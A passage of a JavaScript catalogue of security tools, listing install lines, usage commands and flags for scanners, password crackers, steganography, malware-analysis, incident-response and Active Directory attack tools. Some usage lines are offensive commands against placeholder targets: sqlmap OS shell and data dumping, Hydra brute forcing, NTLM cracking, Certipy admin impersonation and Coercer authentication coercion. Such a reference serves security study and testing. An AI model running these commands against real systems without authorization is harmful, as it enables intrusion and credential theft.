      "zap-api-scan.py -t https://target.com/openapi.json -f openapi"
    ],
    advancedFlags: [
      { flag: "-daemon", desc: "Run as headless daemon" },
      { flag: "quick-scan", desc: "Fast automated scan" },
      { flag: "active-scan", desc: "Full active vulnerability scan" },
      { flag: "spider", desc: "Crawl application" },
      { flag: "ajax-spider", desc: "JavaScript-aware crawler" },
      { flag: "fuzzer", desc: "Payload fuzzing" },
      { flag: "scripts", desc: "Custom active/passive scan rules" }
    ],
    outputFormat: "HTML, XML, JSON, Markdown reports",
    integrations: ["CI/CD pipelines", "Jenkins", "GitHub Actions"],
    url: "https://www.zaproxy.org"
  },
  {
    name: "SQLMap",
    category: "web",
    description: "Automatic SQL injection detection and exploitation — supports MySQL, PostgreSQL, Oracle, MSSQL, SQLite, and more with OS access capabilities",
    install: "sudo apt install sqlmap",
    usage: [
      "sqlmap -u 'http://target.com/page?id=1' --dbs",
      "sqlmap -r request.txt --level=5 --risk=3",
      "sqlmap -u 'http://target.com/page?id=1' --os-shell"
    ],
    advancedFlags: [
      { flag: "-u", desc: "Target URL" },
      { flag: "-r", desc: "Load request from file" },
      { flag: "--dbs", desc: "Enumerate databases" },
      { flag: "--tables", desc: "Enumerate tables" },
      { flag: "--dump", desc: "Dump table data" },
      { flag: "--os-shell", desc: "Get OS shell" },
      { flag: "--level", desc: "Detection level (1-5)" },
      { flag: "--risk", desc: "Risk level (1-3)" },
      { flag: "--tamper", desc: "WAF bypass scripts" },
      { flag: "--technique", desc: "SQLi technique (BEUSTQ)" },
      { flag: "--proxy", desc: "HTTP proxy" }
    ],
    outputFormat: "console text, CSV, dump files",
    integrations: ["Burp Suite", "OWASP ZAP"],
    url: "https://sqlmap.org"
  },
  {
    name: "XSSStrike",
    category: "web",
    description: "Advanced XSS detection with intelligent fuzzing, WAF detection and bypass, context-aware payload generation",
    install: "pip install xsstrike",
    usage: [
      "xsstrike -u 'https://target.com/search?q=test'",
      "xsstrike -u 'https://target.com/search?q=test' --crawl"
    ],
    advancedFlags: [
      { flag: "-u", desc: "Target URL" },
      { flag: "--crawl", desc: "Crawl and test all links" },
      { flag: "--fuzzer", desc: "Run WAF fuzzer" },
      { flag: "--blind", desc: "Test for blind XSS" },
      { flag: "-d", desc: "POST data" },
      { flag: "--headers", desc: "Custom headers" }
    ],
    outputFormat: "console text with payloads",
    integrations: ["Burp Suite"],
    url: "https://github.com/s0md3v/XSStrike"
  },
  {
    name: "Commix",
    category: "web",
    description: "Automated OS command injection exploitation tool — blind, time-based, file-based, and results-based injection techniques",
    install: "sudo apt install commix",
    usage: [
      "commix --url='http://target.com/cmd?ip=127.0.0.1'",
      "commix -r request.txt --os-cmd='id'"
    ],
    advancedFlags: [
      { flag: "--url", desc: "Target URL" },
      { flag: "-r", desc: "Load request from file" },
      { flag: "--os-cmd", desc: "Execute specific OS command" },
      { flag: "--technique", desc: "Injection technique (classic, eval-based, time-based, file-based)" },
      { flag: "--level", desc: "Detection level" },
      { flag: "--tamper", desc: "Tamper scripts" }
    ],
    outputFormat: "console text, shell access",
    integrations: ["Burp Suite"],
    url: "https://github.com/commixproject/commix"
  },

  // ═══════════════════════════════════════════════════════════
  // CRYPTOGRAPHY
  // ═══════════════════════════════════════════════════════════
  {
    name: "Hashcat",
    category: "cryptography",
    description: "World's fastest password recovery tool — GPU-accelerated cracking for 350+ hash types including MD5, SHA, bcrypt, NTLM, WPA, Kerberos",
    install: "sudo apt install hashcat",
    usage: [
      "hashcat -m 0 hashes.txt rockyou.txt",
      "hashcat -m 1000 ntlm.txt rockyou.txt -r best64.rule",
      "hashcat -m 22000 wifi.hc22000 rockyou.txt"
    ],
    advancedFlags: [
      { flag: "-m", desc: "Hash mode (0=MD5, 1000=NTLM, 1800=sha512crypt, etc.)" },
      { flag: "-a", desc: "Attack mode (0=dict, 1=combo, 3=mask, 6=hybrid)" },
      { flag: "-r", desc: "Rules file for word mangling" },
      { flag: "-O", desc: "Optimized kernel (faster, max 32 chars)" },
      { flag: "-w", desc: "Workload profile (1=low, 4=nightmare)" },
      { flag: "--increment", desc: "Incremental mask length" },
      { flag: "--username", desc: "Input has username:hash format" },
      { flag: "--show", desc: "Show cracked passwords" }
    ],
    outputFormat: "console text, potfile (hash:password pairs)",
    integrations: ["Mimikatz", "Rubeus", "Responder", "John the Ripper"],
    url: "https://hashcat.net/hashcat"
  },
  {
    name: "John the Ripper",
    category: "cryptography",
    description: "Versatile password cracker — supports hundreds of hash formats with auto-detection, custom rules, and CPU-optimized kernels",
    install: "sudo apt install john",
    usage: [
      "john --wordlist=rockyou.txt hashes.txt",
      "john --format=NT --rules=best64 hashes.txt",
      "john --show hashes.txt"
    ],
    advancedFlags: [
      { flag: "--wordlist", desc: "Wordlist file" },
      { flag: "--format", desc: "Hash format (auto-detected if omitted)" },
      { flag: "--rules", desc: "Word mangling rules" },
      { flag: "--incremental", desc: "Brute-force mode" },
      { flag: "--show", desc: "Show cracked passwords" },
      { flag: "--list=formats", desc: "List supported formats" },
      { flag: "--fork", desc: "Use N processes" }
    ],
    outputFormat: "console text, john.pot file",
    integrations: ["Hashcat", "*2john conversion tools"],
    url: "https://www.openwall.com/john"
  },
  {
    name: "CyberChef",
    category: "cryptography",
    description: "Web-based data transformation tool — encoding, decoding, encryption, compression, hashing, and analysis in a drag-and-drop 'recipe' interface",
    install: "Browser-based at https://gchq.github.io/CyberChef/",
    usage: [
      "Drag operations to Recipe pane",
      "Base64 > XOR > Gunzip > Strings"
    ],
    advancedFlags: [
      { flag: "Encoding", desc: "Base64, URL, HTML, Hex, Decimal, Binary" },
      { flag: "Encryption", desc: "AES, DES, RC4, RSA, XOR" },
      { flag: "Hashing", desc: "MD5, SHA-1/256/512, HMAC" },
      { flag: "Analysis", desc: "Entropy, frequency, magic detection" },
      { flag: "Networking", desc: "Defang URLs, parse IPs, DNS lookup" },
      { flag: "Forensics", desc: "Extract files, parse timestamps" }
    ],
    outputFormat: "web UI output (text, hex, file download)",
    integrations: ["Browser bookmarklet", "Node.js module"],
    url: "https://gchq.github.io/CyberChef/"
  },

  // ═══════════════════════════════════════════════════════════
  // STEGANOGRAPHY
  // ═══════════════════════════════════════════════════════════
  {
    name: "Steghide",
    category: "steganography",
    description: "Embed and extract data in JPEG, BMP, WAV, and AU files using steganographic techniques",
    install: "sudo apt install steghide",
    usage: [
      "steghide embed -cf image.jpg -ef secret.txt",
      "steghide extract -sf image.jpg",
      "steghide info image.jpg"
    ],
    advancedFlags: [
      { flag: "embed", desc: "Hide data in cover file" },
      { flag: "extract", desc: "Extract hidden data" },
      { flag: "info", desc: "Show file information" },
      { flag: "-cf", desc: "Cover file" },
      { flag: "-ef", desc: "Embed file" },
      { flag: "-sf", desc: "Stego file" },
      { flag: "-p", desc: "Passphrase" },
      { flag: "-f", desc: "Force overwrite" }
    ],
    outputFormat: "extracted file, info text",
    integrations: ["stegcracker (brute-force)", "exiftool"],
    url: "https://steghide.sourceforge.net"
  },
  {
    name: "zsteg",
    category: "steganography",
    description: "Detect steganography in PNG and BMP files — checks LSB, APNG, and various encoding methods",
    install: "gem install zsteg",
    usage: [
      "zsteg image.png",
      "zsteg -a image.png",
      "zsteg image.png -E 'b1,rgb,lsb,xy'"
    ],
    advancedFlags: [
      { flag: "-a", desc: "All methods" },
      { flag: "-E", desc: "Extract data using specific encoding" },
      { flag: "-b", desc: "Bit order" },
      { flag: "--lsb", desc: "Check LSB steganography" }
    ],
    outputFormat: "console text, extracted files",
    integrations: ["exiftool", "Binwalk"],
    url: "https://github.com/zed-0xff/zsteg"
  },
  {
    name: "Exiftool",
    category: "steganography",
    description: "Read, write, and manipulate metadata in image, audio, video, and document files — 25,000+ tags across 400+ file formats",
    install: "sudo apt install libimage-exiftool-perl",
    usage: [
      "exiftool image.jpg",
      "exiftool -all= image.jpg",
      "exiftool -Comment='hidden data' image.jpg"
    ],
    advancedFlags: [
      { flag: "-all=", desc: "Remove all metadata" },
      { flag: "-GPSLatitude", desc: "Read GPS coordinates" },
      { flag: "-Comment", desc: "Read/write comment field" },
      { flag: "-json", desc: "JSON output" },
      { flag: "-r", desc: "Recursive directory processing" }
    ],
    outputFormat: "text, JSON, CSV, XML, HTML",
    integrations: ["steghide", "FOCA", "Metagoofil"],
    url: "https://exiftool.org"
  },

  // ═══════════════════════════════════════════════════════════
  // MALWARE ANALYSIS
  // ═══════════════════════════════════════════════════════════
  {
    name: "YARA",
    category: "malware-analysis",
    description: "Pattern matching tool for malware researchers — create rules to identify and classify malware samples based on textual or binary patterns",
    install: "sudo apt install yara",
    usage: [
      "yara rules.yar suspect_file",
      "yara -r rules.yar /path/to/scan/",
      "yara -s rules.yar suspect_file"
    ],
    advancedFlags: [
      { flag: "-r", desc: "Recursive directory scanning" },
      { flag: "-s", desc: "Show matching strings" },
      { flag: "-c", desc: "Count matches only" },
      { flag: "-n", desc: "Show non-matching rules" },
      { flag: "-w", desc: "Disable warnings" },
      { flag: "-p", desc: "Number of threads" },
      { flag: "-t", desc: "Filter by tag" }
    ],
    outputFormat: "console text (rule_name file_path)",
    integrations: ["ClamAV", "VirusTotal", "MISP", "Volatility"],
    url: "https://virustotal.github.io/yara/"
  },
  {
    name: "Cuckoo Sandbox",
    category: "malware-analysis",
    description: "Automated malware analysis system — execute suspicious files in isolated VMs and observe behavior, API calls, network traffic, and file operations",
    install: "pip install cuckoo && cuckoo -d",
    usage: [
      "cuckoo submit suspect.exe",
      "cuckoo submit --url http://malicious.com",
      "cuckoo api"
    ],
    advancedFlags: [
      { flag: "submit", desc: "Submit sample for analysis" },
      { flag: "--url", desc: "Submit URL for analysis" },
      { flag: "--machine", desc: "Specify VM to use" },
      { flag: "--timeout", desc: "Analysis timeout in seconds" },
      { flag: "api", desc: "Start REST API server" },
      { flag: "web", desc: "Start web interface" }
    ],
    outputFormat: "HTML, JSON, PDF reports with screenshots, PCAP, dropped files",
    integrations: ["YARA", "Volatility", "VirtualBox", "VMware", "VirusTotal"],
    url: "https://cuckoosandbox.org"
  },
  {
    name: "PE-bear",
    category: "malware-analysis",
    description: "Portable Executable analyzer — PE headers, sections, imports/exports, resources, overlay, digital signatures, and anomaly detection",
    install: "Download from https://github.com/hasherezade/pe-bear/releases",
    usage: [
      "PE-bear.exe suspect.exe"
    ],
    advancedFlags: [
      { flag: "Headers", desc: "DOS, NT, Optional, Section headers" },
      { flag: "Imports", desc: "Import Address Table analysis" },
      { flag: "Exports", desc: "Export Directory" },
      { flag: "Resources", desc: "Embedded resource viewer" },
      { flag: "Overlay", desc: "Data beyond PE boundaries" },
      { flag: "Signatures", desc: "Digital signature verification" }
    ],
    outputFormat: "GUI visualization",
    integrations: ["Ghidra", "IDA Pro", "VirusTotal"],
    url: "https://github.com/hasherezade/pe-bear"
  },
  {
    name: "Detect It Easy (DIE)",
    category: "malware-analysis",
    description: "Determine file type, packer, compiler, and protector of executable files. Supports PE, ELF, Mach-O, and more",
    install: "Download from https://github.com/horsicq/Detect-It-Easy/releases",
    usage: [
      "diec suspect.exe",
      "diec -d /path/to/samples/"
    ],
    advancedFlags: [
      { flag: "-d", desc: "Scan directory" },
      { flag: "-r", desc: "Recursive scan" },
      { flag: "-j", desc: "JSON output" },
      { flag: "Entropy", desc: "Section entropy analysis" },
      { flag: "Heuristic", desc: "Heuristic detection" }
    ],
    outputFormat: "text, JSON",
    integrations: ["Ghidra", "IDA Pro", "PE-bear"],
    url: "https://github.com/horsicq/Detect-It-Easy"
  },
  {
    name: "REMnux",
    category: "malware-analysis",
    description: "Linux distribution for reverse engineering and analyzing malware — pre-installed with 600+ tools for static/dynamic analysis, memory forensics, and network analysis",
    install: "Download OVA from https://remnux.org or install on existing Ubuntu",
    usage: [
      "Boot the VM or install: remnux install",
      "Tools organized by category in application menu"
    ],
    advancedFlags: [
      { flag: "Static Analysis", desc: "file, strings, PEframe, YARA, ssdeep" },
      { flag: "Dynamic Analysis", desc: "Cuckoo, DRAKVUF, Procmon" },
      { flag: "Memory", desc: "Volatility, Rekall" },
      { flag: "Network", desc: "Wireshark, NetworkMiner, INetSim, FakeNet" },
      { flag: "Documents", desc: "olevba, pdfid, didier-stevens suite" }
    ],
    outputFormat: "varies by tool",
    integrations: ["All included tools are pre-configured"],
    url: "https://remnux.org"
  },

  // ═══════════════════════════════════════════════════════════
  // INCIDENT RESPONSE
  // ═══════════════════════════════════════════════════════════
  {
    name: "Velociraptor",
    category: "incident-response",
    description: "Endpoint visibility and digital forensics platform — deploy agents for artifact collection, live monitoring, hunting across thousands of endpoints",
    install: "Download from https://github.com/Velocidex/velociraptor/releases",
    usage: [
      "velociraptor gui",
      "velociraptor --config server.config.yaml frontend",
      "Collect artifacts via web GUI"
    ],
    advancedFlags: [
      { flag: "VQL", desc: "Velociraptor Query Language for artifact creation" },
      { flag: "Artifacts", desc: "Pre-built collection recipes (processes, files, registry, events)" },
      { flag: "Hunts", desc: "Search across all endpoints simultaneously" },
      { flag: "Monitoring", desc: "Real-time event monitoring" },
      { flag: "Notebooks", desc: "Collaborative analysis" }
    ],
    outputFormat: "JSON, CSV, web UI, VQL results",
    integrations: ["ELK Stack", "Splunk", "YARA", "Sigma"],
    url: "https://docs.velociraptor.app"
  },
  {
    name: "GRR Rapid Response",
    category: "incident-response",
    description: "Google's incident response framework — remote live forensics at scale. Collect artifacts, memory, and system state from endpoints",
    install: "pip install grr-response-server grr-response-client",
    usage: [
      "grr_server --config=/etc/grr/server.yaml",
      "Access web UI at https://localhost:8443"
    ],
    advancedFlags: [
      { flag: "Flows", desc: "Collection actions (file, registry, process, memory)" },
      { flag: "Hunts", desc: "Scale flows to thousands of machines" },
      { flag: "Artifacts", desc: "Pre-defined forensic collections" },
      { flag: "Cronjobs", desc: "Scheduled recurring collections" },
      { flag: "API", desc: "REST API for automation" }
    ],
    outputFormat: "web UI, JSON via API, exported artifacts",
    integrations: ["Plaso (timeline)", "Volatility", "YARA"],
    url: "https://github.com/google/grr"
  },
  {
    name: "TheHive",
    category: "incident-response",
    description: "Security incident response platform — case management, alert intake, observable analysis, playbook automation, and team collaboration",
    install: "docker-compose up -d (with docker-compose.yml from thehive-project.org)",
    usage: [
      "Access web UI at http://localhost:9000",
      "Create case > Add observables > Run analyzers"
    ],
    advancedFlags: [
      { flag: "Cases", desc: "Incident tracking with tasks and observables" },
      { flag: "Alerts", desc: "Automated alert intake from SIEM/IDS" },
      { flag: "Cortex", desc: "Observable analysis engine (100+ analyzers)" },
      { flag: "MISP", desc: "Threat intel feed integration" },
      { flag: "Playbooks", desc: "Automated response workflows" }
    ],
    outputFormat: "web UI, JSON via REST API",
    integrations: ["Cortex", "MISP", "ELK Stack", "Splunk", "PagerDuty"],
    url: "https://thehive-project.org"
  },
  {
    name: "MISP",
    category: "incident-response",
    description: "Malware Information Sharing Platform — collect, store, distribute, and share IOCs and threat intelligence in structured formats",
    install: "Install via MISP install script or Docker",
    usage: [
      "Access web UI",
      "Events > Add Event > Add attributes/objects",
      "Sync > Pull/Push with partner organizations"
    ],
    advancedFlags: [
      { flag: "Events", desc: "Incident/threat intelligence containers" },
      { flag: "Attributes", desc: "IOCs (IPs, domains, hashes, emails)" },
      { flag: "Galaxies", desc: "Contextual clusters (MITRE ATT&CK, threat actors)" },
      { flag: "Feeds", desc: "Automated threat intel feed import" },
      { flag: "Warninglists", desc: "Known-good lists to reduce false positives" },
      { flag: "PyMISP", desc: "Python API library" }
    ],
    outputFormat: "MISP JSON, STIX 1.x/2.x, OpenIOC, CSV, Bro/Zeek, Snort, Suricata",
    integrations: ["TheHive", "Cortex", "Splunk", "ELK", "Sigma", "YARA"],
    url: "https://www.misp-project.org"
  },
  {
    name: "Splunk",
    category: "incident-response",
    description: "Enterprise SIEM and log analysis platform — collect, index, search, and correlate machine data for security monitoring and incident response",
    install: "Download from splunk.com (Free up to 500MB/day)",
    usage: [
      "./splunk start",
      "Access at http://localhost:8000",
      "index=main sourcetype=syslog | stats count by src_ip"
    ],
    advancedFlags: [
      { flag: "SPL", desc: "Search Processing Language" },
      { flag: "index", desc: "Data repository" },
      { flag: "sourcetype", desc: "Data format classification" },
      { flag: "| stats", desc: "Statistical aggregation" },
      { flag: "| table", desc: "Tabular output" },
      { flag: "| where", desc: "Filter results" },
      { flag: "alerts", desc: "Threshold-based alerting" },
      { flag: "dashboards", desc: "Visual analysis" }
    ],
    outputFormat: "web UI, CSV, JSON, PDF reports",
    integrations: ["SOAR platforms", "MISP", "VirusTotal", "MITRE ATT&CK"],
    url: "https://www.splunk.com"
  },
  {
    name: "ELK Stack",
    category: "incident-response",
    description: "Elasticsearch, Logstash, Kibana — open-source log management and SIEM stack. Collect, parse, index, and visualize security data",
    install: "docker-compose with elastic.co images or apt install elasticsearch logstash kibana",
    usage: [
      "Elasticsearch: http://localhost:9200",
      "Kibana: http://localhost:5601",
      "Logstash pipeline: input { beats { port => 5044 } } filter { ... } output { elasticsearch { ... } }"
    ],
    advancedFlags: [
      { flag: "Beats", desc: "Lightweight data shippers (Filebeat, Winlogbeat, Packetbeat)" },
      { flag: "Logstash", desc: "Data pipeline processing (grok, mutate, geoip)" },
      { flag: "KQL", desc: "Kibana Query Language" },
      { flag: "Elastic Security", desc: "Built-in SIEM with detection rules" },
      { flag: "Elastic Agent", desc: "Unified endpoint agent" }
    ],
    outputFormat: "Kibana dashboards, JSON, CSV",
    integrations: ["Sigma rules", "MISP", "TheHive", "Wazuh"],
    url: "https://www.elastic.co/elastic-stack"
  },

  // ═══════════════════════════════════════════════════════════
  // ADDITIONAL TOOLS
  // ═══════════════════════════════════════════════════════════
  {
    name: "Hydra",
    category: "web",
    description: "Fast and flexible online password cracker — supports 50+ protocols including SSH, FTP, HTTP, RDP, SMB, LDAP, MySQL, and more",
    install: "sudo apt install hydra",
    usage: [
      "hydra -l admin -P rockyou.txt ssh://192.168.1.10",
      "hydra -L users.txt -P passwords.txt http-post-form '//login:user=^USER^&pass=^PASS^:Invalid'"
    ],
    advancedFlags: [
      { flag: "-l/-L", desc: "Single username / username list" },
      { flag: "-p/-P", desc: "Single password / password list" },
      { flag: "-t", desc: "Parallel tasks (default 16)" },
      { flag: "-V", desc: "Verbose (show each attempt)" },
      { flag: "-e nsr", desc: "Try null, same-as-login, reversed passwords" },
      { flag: "-o", desc: "Output file" },
      { flag: "-M", desc: "Target list file" },
      { flag: "-s", desc: "Custom port" }
    ],
    outputFormat: "console text, output file",
    integrations: ["Burp Suite", "Medusa"],
    url: "https://github.com/vanhauser-thc/thc-hydra"
  },
  {
    name: "CeWL",
    category: "web",
    description: "Custom Word List generator — spider a target website and create a targeted wordlist from the content found",
    install: "sudo apt install cewl",
    usage: [
      "cewl -d 3 -m 5 -w wordlist.txt https://target.com",
      "cewl -d 2 -e --email_file emails.txt https://target.com"
    ],
    advancedFlags: [
      { flag: "-d", desc: "Spider depth" },
      { flag: "-m", desc: "Minimum word length" },
      { flag: "-w", desc: "Output wordlist file" },
      { flag: "-e", desc: "Extract emails" },
      { flag: "--email_file", desc: "Email output file" },
      { flag: "-a", desc: "Include meta data" },
      { flag: "--with-numbers", desc: "Accept words with numbers" }
    ],
    outputFormat: "text (word list), email list",
    integrations: ["Hashcat", "John the Ripper", "Hydra"],
    url: "https://github.com/digininja/CeWL"
  },
  {
    name: "Enum4linux-ng",
    category: "web",
    description: "Windows/Samba enumeration tool — users, groups, shares, password policies, OS info via SMB/RPC/LDAP. Successor to enum4linux",
    install: "pip install enum4linux-ng",
    usage: [
      "enum4linux-ng -A 192.168.1.10",
      "enum4linux-ng -u user -p pass -oY output.yaml 192.168.1.10"
    ],
    advancedFlags: [
      { flag: "-A", desc: "All enumeration" },
      { flag: "-u/-p", desc: "Credentials" },
      { flag: "-U", desc: "Enumerate users" },
      { flag: "-S", desc: "Enumerate shares" },
      { flag: "-G", desc: "Enumerate groups" },
      { flag: "-P", desc: "Get password policy" },
      { flag: "-oY", desc: "YAML output" },
      { flag: "-oJ", desc: "JSON output" }
    ],
    outputFormat: "text, JSON, YAML",
    integrations: ["CrackMapExec", "Impacket"],
    url: "https://github.com/cddmp/enum4linux-ng"
  },
  {
    name: "Certipy",
    category: "post-exploitation",
    description: "Active Directory Certificate Services (AD CS) enumeration and exploitation — find and exploit ESC1-ESC8 misconfigurations for domain compromise",
    install: "pip install certipy-ad",
    usage: [
      "certipy find -u user@corp.local -p pass -dc-ip DC_IP -vulnerable",
      "certipy req -u user@corp.local -p pass -ca CA -template VulnTemplate -upn admin@corp.local",
      "certipy auth -pfx admin.pfx -dc-ip DC_IP"
    ],
    advancedFlags: [
      { flag: "find", desc: "Enumerate certificate templates" },
      { flag: "-vulnerable", desc: "Show only exploitable templates" },
      { flag: "req", desc: "Request certificate" },
      { flag: "-upn", desc: "Target UPN for ESC1" },
      { flag: "auth", desc: "Authenticate with certificate" },
      { flag: "shadow", desc: "Shadow Credentials attack" },
      { flag: "forge", desc: "Forge certificate" }
    ],
    outputFormat: "console text, PFX certificate files, BloodHound JSON",
    integrations: ["BloodHound", "Impacket", "Mimikatz"],
    url: "https://github.com/ly4k/Certipy"
  },
  {
    name: "Coercer",
    category: "post-exploitation",
    description: "Automatically coerce Windows authentication from target machines using 16+ RPC methods (PetitPotam, PrinterBug, DFSCoerce, etc.)",
    install: "pip install coercer",
    usage: [
      "coercer coerce -l LISTENER_IP -t TARGET_IP -u user -p pass -d corp.local",
      "coercer scan -t TARGET_IP -u user -p pass -d corp.local"
    ],
    advancedFlags: [
      { flag: "coerce", desc: "Execute authentication coercion" },
      { flag: "scan", desc: "Check available coercion methods" },
      { flag: "-l", desc: "Listener IP (where auth is sent)" },
      { flag: "-t", desc: "Target to coerce" },
      { flag: "--filter-method-name", desc: "Filter by method name" },
      { flag: "--filter-protocol-name", desc: "Filter by protocol" }
    ],
    outputFormat: "console text",
    integrations: ["Responder", "ntlmrelayx", "Mimikatz"],
    url: "https://github.com/p0dalirius/Coercer"
  },
  {
    name: "Amass",
    category: "osint",
    description: "In-depth attack surface mapping — subdomain enumeration using active/passive DNS, web scraping, certificate transparency, and API integrations",
    install: "go install github.com/owasp-amass/amass/v4/...@master",
    usage: [
      "amass enum -d example.com -passive",
      "amass enum -d example.com -brute -w subdomains.txt",
      "amass intel -d example.com -whois"
    ],
    advancedFlags: [
      { flag: "enum", desc: "Subdomain enumeration" },
      { flag: "intel", desc: "Intelligence gathering (WHOIS, related domains)" },
      { flag: "-passive", desc: "No active probing" },
      { flag: "-brute", desc: "DNS brute force" },
      { flag: "-w", desc: "Brute force wordlist" },
      { flag: "-config", desc: "Configuration file with API keys" },
      { flag: "-d3", desc: "Output as D3.js visualization" }
    ],
    outputFormat: "text, JSON, D3.js HTML",
    integrations: ["Subfinder", "httpx", "Nuclei", "Maltego"],
    url: "https://github.com/owasp-amass/amass"
  },
  {
    name: "Subfinder",
    category: "osint",
    description: "Fast passive subdomain enumeration tool — uses 40+ data sources including certificate transparency, search engines, and threat intel feeds",
    install: "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
    usage: [
      "subfinder -d example.com -all -o subs.txt",
      "subfinder -dL domains.txt -recursive"
    ],
    advancedFlags: [
      { flag: "-d", desc: "Target domain" },
      { flag: "-dL", desc: "Domain list file" },
      { flag: "-all", desc: "Use all sources" },
      { flag: "-recursive", desc: "Recursive enumeration" },
      { flag: "-o", desc: "Output file" },
      { flag: "-silent", desc: "Only show subdomains" },
      { flag: "-pc", desc: "Provider config file (API keys)" }
    ],
    outputFormat: "text (one per line), JSON (-oJ)",
    integrations: ["httpx", "Nuclei", "Amass"],
    url: "https://github.com/projectdiscovery/subfinder"
  },
  {
    name: "httpx",
    category: "osint",
    description: "Fast and multi-purpose HTTP toolkit — probe URLs for live hosts with tech detection, status codes, titles, content length, and more",
    install: "go install github.com/projectdiscovery/httpx/cmd/httpx@latest",
    usage: [
      "cat subs.txt | httpx -sc -title -tech-detect",
      "echo target.com | httpx -probe -follow-redirects -ip"
    ],
    advancedFlags: [
      { flag: "-sc", desc: "Show status code" },
      { flag: "-title", desc: "Show page title" },
      { flag: "-tech-detect", desc: "Technology detection (Wappalyzer)" },
      { flag: "-follow-redirects", desc: "Follow HTTP redirects" },
      { flag: "-ip", desc: "Show resolved IP" },
      { flag: "-web-server", desc: "Show web server" },
      { flag: "-content-length", desc: "Show content length" },
      { flag: "-screenshot", desc: "Take screenshots" },
      { flag: "-json", desc: "JSON output" }
    ],
    outputFormat: "text, JSON",
    integrations: ["subfinder", "Nuclei", "katana (crawler)"],
    url: "https://github.com/projectdiscovery/httpx"
  },
  {
    name: "Snort",
    category: "incident-response",
    description: "Open-source network intrusion detection and prevention system — real-time traffic analysis, packet logging, protocol analysis, content matching",
    install: "sudo apt install snort",
    usage: [
      "snort -A console -q -c /etc/snort/snort.conf -i eth0",
      "snort -r capture.pcap -c /etc/snort/snort.conf"
    ],
    advancedFlags: [
      { flag: "-A", desc: "Alert mode (fast, full, console, none)" },
      { flag: "-c", desc: "Configuration file" },
      { flag: "-i", desc: "Interface" },
      { flag: "-r", desc: "Read PCAP file" },
      { flag: "-l", desc: "Log directory" },
      { flag: "-q", desc: "Quiet mode" },
      { flag: "Rules", desc: "alert tcp any any -> $HOME_NET 22 (msg:\"SSH brute force\"; threshold:...)" }
    ],
    outputFormat: "alerts (fast/full/unified), packet logs",
    integrations: ["Barnyard2", "PulledPork", "Snorby", "ELK Stack"],
    url: "https://www.snort.org"
  },
  {
    name: "Suricata",
    category: "incident-response",
    description: "High-performance network IDS/IPS and security monitoring engine — multi-threaded, supports Snort rules, protocol detection, file extraction",
    install: "sudo apt install suricata",
    usage: [
      "suricata -c /etc/suricata/suricata.yaml -i eth0",
      "suricata -r capture.pcap -c /etc/suricata/suricata.yaml"
    ],
    advancedFlags: [
      { flag: "-c", desc: "Configuration file" },
      { flag: "-i", desc: "Interface" },
      { flag: "-r", desc: "Read PCAP" },
      { flag: "--af-packet", desc: "AF_PACKET for high-speed capture" },
      { flag: "-S", desc: "Specific rules file" },
      { flag: "eve.json", desc: "Main JSON event log" },
      { flag: "Lua scripting", desc: "Custom detection logic" }
    ],
    outputFormat: "EVE JSON (alerts, DNS, HTTP, TLS, files), fast.log, stats.log",
    integrations: ["ELK Stack", "Splunk", "Wazuh", "TheHive"],
    url: "https://suricata.io"
  },
  {
    name: "Wazuh",
    category: "incident-response",
    description: "Open-source XDR and SIEM platform — endpoint detection, log analysis, file integrity monitoring, vulnerability detection, compliance",
    install: "curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh && bash wazuh-install.sh -a",
    usage: [
      "systemctl start wazuh-manager",
      "Access Wazuh dashboard at https://localhost",
      "/var/ossec/bin/agent_control -l (list agents)"
    ],
    advancedFlags: [
      { flag: "Agents", desc: "Endpoint monitoring agents" },
      { flag: "Rules", desc: "Custom detection rules (XML)" },
      { flag: "Decoders", desc: "Log parsing definitions" },
      { flag: "SCA", desc: "Security Configuration Assessment" },
      { flag: "FIM", desc: "File Integrity Monitoring" },
      { flag: "Vulnerability Detector", desc: "CVE scanning of installed packages" },
      { flag: "Active Response", desc: "Automated response actions" }
    ],
    outputFormat: "Wazuh dashboard, JSON alerts, Elasticsearch",
    integrations: ["TheHive", "MISP", "VirusTotal", "Shuffle SOAR"],
    url: "https://wazuh.com"
  },
  {
    name: "Sysmon",
    category: "incident-response",
    description: "Windows system monitoring driver — logs process creation, network connections, file changes, registry modifications, and more with detailed context",
    install: "Download from docs.microsoft.com/sysinternals/downloads/sysmon",
    usage: [
      "sysmon64.exe -accepteula -i sysmonconfig.xml",
      "sysmon64.exe -c sysmonconfig.xml"
    ],
    advancedFlags: [
      { flag: "-i", desc: "Install with configuration" },
      { flag: "-c", desc: "Update configuration" },
      { flag: "-u", desc: "Uninstall" },
      { flag: "Event ID 1", desc: "Process creation" },
      { flag: "Event ID 3", desc: "Network connection" },
      { flag: "Event ID 7", desc: "Image loaded (DLL)" },
      { flag: "Event ID 8", desc: "CreateRemoteThread" },
      { flag: "Event ID 10", desc: "Process access (LSASS dump detection)" },
      { flag: "Event ID 11", desc: "File created" },
      { flag: "Event ID 22", desc: "DNS query" }
    ],
    outputFormat: "Windows Event Log (Microsoft-Windows-Sysmon/Operational)",
    integrations: ["Splunk", "ELK (Winlogbeat)", "Sigma rules", "Wazuh"],
    url: "https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon"
  },
  {
    name: "RITA",
    category: "incident-response",
    description: "Real Intelligence Threat Analytics — detect C2 beaconing, DNS tunneling, and long connections in Zeek/Bro logs using statistical analysis",
    install: "Download from https://github.com/activecm/rita/releases",
    usage: [
      "rita import zeek_logs/ -d dataset_name",
      "rita show-beacons dataset_name",
      "rita html-report dataset_name"
    ],
    advancedFlags: [
      { flag: "import", desc: "Import Zeek logs into database" },
      { flag: "show-beacons", desc: "Detect C2 beaconing patterns" },
      { flag: "show-long-connections", desc: "Find sustained connections" },
      { flag: "show-dns-fqdn-count", desc: "DNS tunneling detection" },
      { flag: "show-strobes", desc: "Detect rapid-fire connections" },
      { flag: "html-report", desc: "Generate HTML analysis report" }
    ],
    outputFormat: "console text, HTML report",
    integrations: ["Zeek", "MongoDB"],
    url: "https://github.com/activecm/rita"
  },
  {
    name: "Seatbelt",
    category: "post-exploitation",
    description: "C# safety checks from a security perspective — enumerate 90+ security-relevant system settings on Windows (credentials, defenses, interesting files)",
    install: "Compile from https://github.com/GhostPack/Seatbelt",
    usage: [
      "Seatbelt.exe -group=all",
      "Seatbelt.exe -group=user",
      "Seatbelt.exe -group=system"
    ],
    advancedFlags: [
      { flag: "-group=all", desc: "Run all checks" },
      { flag: "-group=user", desc: "User-level checks only" },
      { flag: "-group=system", desc: "System-level checks (needs admin)" },
      { flag: "-group=misc", desc: "Miscellaneous checks" },
